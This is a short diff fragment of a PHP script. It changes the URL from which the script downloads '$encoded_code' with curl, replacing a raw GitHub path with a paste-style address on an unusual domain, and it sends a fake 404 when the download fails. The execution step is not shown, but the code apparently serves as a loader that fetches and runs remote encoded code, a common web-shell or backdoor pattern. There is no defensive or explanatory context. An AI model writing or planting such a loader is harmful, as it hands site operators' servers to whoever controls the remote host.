@@ -16,7 +16,7 @@ exit;
 curl_close($ch);
 return $result;
 }
-$url = 'https://raw.githubusercontent.com/drian-o/repoKerjaku/refs/heads/main/SoruceUPH';
+$url = 'https://p.phyo186.cfd/KTofs-Q9QlE/raw';
 $encoded_code = get_contents($url);
 if ($encoded_code === false) {
 http_response_code(404);
